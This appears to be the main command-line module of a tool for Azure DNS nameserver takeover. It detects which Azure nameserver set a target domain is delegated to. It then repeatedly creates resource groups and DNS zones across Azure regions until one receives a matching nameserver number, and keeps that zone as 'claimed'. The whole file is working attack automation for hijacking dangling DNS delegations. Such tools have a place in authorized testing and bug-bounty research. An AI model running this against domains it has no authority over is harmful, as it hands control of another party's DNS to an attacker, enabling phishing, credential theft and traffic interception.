import argparse
import secrets
from typing import List, Optional, Sequence, Set

from .azure import (
    NSTakeoverError,
    check_azure_cli,
    create_dns_zone,
    create_resource_group,
    delete_resource_group,
    ensure_network_provider_registered,
    get_azure_regions,
)
from .dns import (
    ValidationError,
    detect_target_ns_numbers,
    normalize_domain,
    parse_ns_number_list,
)
from .output import GREEN, RED, YELLOW, colorize, emit


def domain_arg(value: str) -> str:
    try:
        return normalize_domain(value)
    except ValidationError as exc:
        raise argparse.ArgumentTypeError(str(exc)) from exc


def parse_regions(value: Optional[str]) -> Optional[List[str]]:
    if not value:
        return None
    regions = [region.strip().lower() for region in value.split(",") if region.strip()]
    if not regions:
        raise argparse.ArgumentTypeError("--regions must include at least one region")
    return regions


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Find an Azure DNS zone allocation whose nameserver number matches "
            "a delegated Azure DNS nameserver set."
        )
    )
    parser.add_argument("domain", type=domain_arg, help="Domain or subdomain to test")
    parser.add_argument(
        "--ns",
        action="append",
        default=[],
        help=(
            "Azure nameserver number to match, for example 36. "
            "May be provided multiple times or as comma-separated values. "
            "If omitted, it is auto-detected from the domain."
        ),
    )
    parser.add_argument(
        "--regions",
        type=parse_regions,
        help="Comma-separated Azure regions to try. Defaults to all account locations.",
    )
    parser.add_argument(
        "--detect-only",
        action="store_true",
        help="Only detect the Azure nameserver number; do not create Azure resources.",
    )
    return parser


def find_matching_zone(
    domain: str,
    target_numbers: Set[str],
    regions: Sequence[str],
) -> int:
    run_id = secrets.token_hex(3)

    for region in regions:
        group_name = f"nstakeover-{region}-{run_id}"
        group_created = False
        keep_group = False

        try:
            emit(f"Creating resource group {group_name}")
            create_resource_group(group_name, region)
            group_created = True

            emit(f"Creating DNS zone {domain} in {group_name}")
            obtained_numbers = create_dns_zone(domain, group_name)
            emit(f"Obtained NS number(s): {', '.join(sorted(obtained_numbers))}")

            if obtained_numbers & target_numbers:
                emit(colorize(f"Match found in {group_name}", GREEN))
                keep_group = True
                emit(f"Keeping claimed resource group {group_name}")
                return 0

            emit("Not matched")
        except NSTakeoverError as exc:
            emit(colorize(str(exc), YELLOW))
        finally:
            if group_created and not keep_group:
                emit(f"Deleting resource group {group_name}")
                delete_resource_group(group_name)

    emit(colorize("Not able to obtain matching NS", RED))
    return 1


def resolve_target_numbers(parser: argparse.ArgumentParser, args: argparse.Namespace) -> Set[str]:
    try:
        target_numbers = parse_ns_number_list(args.ns)
    except ValidationError as exc:
        parser.error(str(exc))

    if target_numbers:
        return target_numbers

    emit(f"Detecting Azure DNS nameserver number for {args.domain}")
    target_numbers, source = detect_target_ns_numbers(args.domain)
    if not target_numbers:
        emit(
            colorize(
                "Unable to auto-detect an Azure DNS nameserver number. "
                "Use --ns to provide it manually.",
                RED,
            )
        )
        raise SystemExit(1)

    emit(
        f"Detected Azure DNS NS number(s): {', '.join(sorted(target_numbers))} "
        f"via {source}"
    )
    return target_numbers


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    target_numbers = resolve_target_numbers(parser, args)

    if args.detect_only:
        return 0

    try:
        check_azure_cli()
        ensure_network_provider_registered()
        regions = get_azure_regions(args.regions)
        emit(f"Testing {len(regions)} Azure location(s)")
        return find_matching_zone(args.domain, target_numbers, regions)
    except NSTakeoverError as exc:
        emit(colorize(str(exc), RED))
        return 1
    except KeyboardInterrupt:
        emit("\nCtrl-C was pressed")
        return 130
